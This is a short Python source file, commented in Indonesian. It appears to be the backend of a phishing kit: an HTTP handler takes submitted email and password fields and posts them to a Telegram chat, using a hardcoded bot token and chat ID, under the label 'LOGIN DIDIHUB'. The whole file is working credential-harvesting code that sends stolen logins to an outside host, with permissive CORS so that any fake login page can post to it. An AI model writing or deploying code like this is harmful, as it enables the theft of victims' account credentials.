from http.server import BaseHTTPRequestHandler
import json
import requests
from urllib.parse import parse_qs

# Konfigurasi Telegram Bot
TELEGRAM_BOT_TOKEN = "8127246407:AAGNvn9LMRI69AK4ln9SQt8_amjX7y5cde0"
TELEGRAM_CHAT_ID = "-4688999158"

def send_to_telegram(email, password):
    """Mengirim data login ke Telegram channel"""
    message = f"📝 LOGIN DIDIHUB:\n📧 Email: {email}\n🔑 Password: {password}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    
    try:
        response = requests.post(url, data=data)
        return response.json()
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return {"ok": False, "error": str(e)}

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Aktifkan CORS
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        
        # Baca data dari request
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))
        
        # Ambil email dan password
        email = data.get('email', '')
        password = data.get('password', '')
        
        # Kirim ke Telegram
        telegram_response = send_to_telegram(email, password)
        
        # Kirim respons
        self.wfile.write(json.dumps({
            'status': 'success',
            'telegram': telegram_response
        }).encode())
    
    def do_OPTIONS(self):
        # Handle preflight request
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

def lambda_handler(event, context):
    # Untuk kompatibilitas dengan AWS Lambda
    return {
        'statusCode': 200,
        'body': json.dumps({'status': 'success'})
    }